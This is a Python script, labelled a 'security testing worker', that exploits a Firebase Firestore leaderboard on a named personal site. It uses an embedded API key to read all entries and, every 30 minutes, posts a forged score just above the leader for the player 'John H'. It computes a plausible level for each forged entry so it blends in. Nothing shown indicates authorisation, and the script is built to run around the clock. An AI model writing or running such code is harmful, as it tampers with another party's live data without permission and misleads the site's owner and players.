"""
AUTOMATED SECURITY TESTING WORKER
==================================
Continuously tests Firebase security vulnerability by incrementally
submitting higher scores to demonstrate the lack of validation.

DEPLOYMENT: Run this on a Raspberry Pi for 24/7 security testing
FREQUENCY: Checks every 30 minutes and submits a score 10 points higher

This demonstrates that without proper security rules, an automated
script can continuously manipulate the leaderboard.
"""

import requests
import json
import time
from datetime import datetime
import sys

# Firebase configuration
FIREBASE_CONFIG = {
    "apiKey": "AIzaSyBDM1Tk1Pj1M1O1jkPHXsKSlnj1h4kp1km0",
    "projectId": "leaderboard-personal-site"
}

PLAYER_NAME = "John H"
CHECK_INTERVAL = 30 * 60  # 30 minutes in seconds
SCORE_INCREMENT = 10

class SecurityTester:
    def __init__(self):
        self.project_id = FIREBASE_CONFIG["projectId"]
        self.api_key = FIREBASE_CONFIG["apiKey"]
        self.base_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents"

    def calculate_level_from_score(self, score, legitimate_entries):
        """Calculate level based on linear distribution of legitimate scores"""
        if not legitimate_entries:
            # No legitimate entries - default to level 1
            return 1

        # Filter out any zero scores
        valid_entries = [e for e in legitimate_entries if e['score'] > 0]
        if not valid_entries:
            return 1

        # Sort by score
        sorted_entries = sorted(valid_entries, key=lambda x: x['score'])

        # Find where our score would fit
        min_score = sorted_entries[0]['score']
        max_score = sorted_entries[-1]['score']
        min_level = sorted_entries[0]['level']
        max_level = sorted_entries[-1]['level']

        if score <= min_score:
            return min_level
        elif score >= max_score:
            return max_level
        else:
            # Linear interpolation
            score_range = max_score - min_score
            level_range = max_level - min_level
            score_position = (score - min_score) / score_range
            calculated_level = min_level + int(score_position * level_range)
            return max(1, calculated_level)  # Ensure at least level 1

    def get_current_high_score(self):
        """Fetch current high score and level from leaderboard, plus who has it"""
        try:
            url = f"{self.base_url}/scores"
            params = {"key": self.api_key}

            response = requests.get(url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                documents = data.get('documents', [])

                if not documents:
                    return 0, 1, None, True, []

                # Separate entries by player
                player_entries = []
                all_entries = []
                legitimate_entries = []  # Entries NOT from John H

                for doc in documents:
                    fields = doc.get('fields', {})
                    name = fields.get('name', {}).get('stringValue', '')
                    score = int(fields.get('score', {}).get('integerValue', '0'))
                    level = int(fields.get('level', {}).get('integerValue', '1'))

                    entry = {'name': name, 'score': score, 'level': level}
                    all_entries.append(entry)

                    if name == PLAYER_NAME:
                        player_entries.append(entry)
                    else:
                        legitimate_entries.append(entry)

                # Find who has the highest score
                max_entry = max(all_entries, key=lambda x: x['score'])
                max_score = max_entry['score']
                high_score_holder = max_entry['name']

                # Check if John H is the current leader
                is_john_h_leader = (high_score_holder == PLAYER_NAME)

                return max_score, 0, high_score_holder, is_john_h_leader, legitimate_entries
            else:
                print(f"Error fetching scores: {response.status_code}")
                return 0, 1, None, True, []

        except Exception as e:
            print(f"Error getting high score: {e}")
            return 0, 1, None, True, []

    def submit_score(self, score, level):
        """Submit a new high score"""
        try:
            url = f"{self.base_url}/scores?key={self.api_key}"

            timestamp = datetime.now().isoformat() + "Z"
            payload = {
                "fields": {
                    "name": {"stringValue": PLAYER_NAME},
                    "score": {"integerValue": str(score)},
                    "level": {"integerValue": str(level)},
                    "timestamp": {"timestampValue": timestamp}
                }
            }

            headers = {"Content-Type": "application/json"}
            response = requests.post(url, json=payload, headers=headers, timeout=10)

            if response.status_code in [200, 201]:
                return True
            else:
                print(f"Submission failed: {response.status_code}")
                print(response.text)
                return False

        except Exception as e:
            print(f"Error submitting score: {e}")
            return False

    def run_continuous_test(self):
        """Main loop - runs continuously"""
        print("=" * 70)
        print("AUTOMATED SECURITY TESTING WORKER")
        print("=" * 70)
        print(f"Target: jordancota.site")
        print(f"Player: {PLAYER_NAME}")
        print(f"Check interval: {CHECK_INTERVAL / 60} minutes")
        print(f"Score increment: +{SCORE_INCREMENT} points")
        print("=" * 70)
        print()

        iteration = 0

        while True:
            iteration += 1
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            print(f"[{timestamp}] Iteration #{iteration}")
            print("-" * 70)

            # Get current high score and legitimate entries
            print("Fetching current high score and legitimate entries...")
            current_high, _, leader_name, is_john_h_leader, legitimate_entries = self.get_current_high_score()
            print(f"Current high score: {current_high} (held by: {leader_name})")
            print(f"Found {len(legitimate_entries)} legitimate entries (excluding {PLAYER_NAME})")

            # Check if John H is already the leader
            if is_john_h_leader:
                print(f"✓ {PLAYER_NAME} is already the leader! No submission needed.")
                print(f"  Waiting for someone else to beat the score...")
            else:
                # Calculate new score and level based on distribution
                new_score = current_high + SCORE_INCREMENT
                new_level = self.calculate_level_from_score(new_score, legitimate_entries)
                print(f"New score to submit: {new_score}")
                print(f"Calculated level (based on score distribution): {new_level}")

                # Submit new score
                print(f"Submitting for {PLAYER_NAME}...")
                success = self.submit_score(new_score, new_level)

                if success:
                    print(f"SUCCESS: Submitted score={new_score}, level={new_level} for {PLAYER_NAME}")
                    print(f"  {PLAYER_NAME} is now the leader!")
                else:
                    print("FAILED: Could not submit score")

            print()
            print(f"Waiting {CHECK_INTERVAL / 60} minutes until next test...")
            print("=" * 70)
            print()

            # Wait before next iteration
            time.sleep(CHECK_INTERVAL)

def main():
    """Entry point"""
    print()
    print("SECURITY VULNERABILITY TESTING")
    print("This script demonstrates continuous exploitation of")
    print("Firebase security vulnerabilities.")
    print()

    tester = SecurityTester()

    try:
        tester.run_continuous_test()
    except KeyboardInterrupt:
        print()
        print("=" * 70)
        print("Security testing stopped by user")
        print("=" * 70)
        sys.exit(0)
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
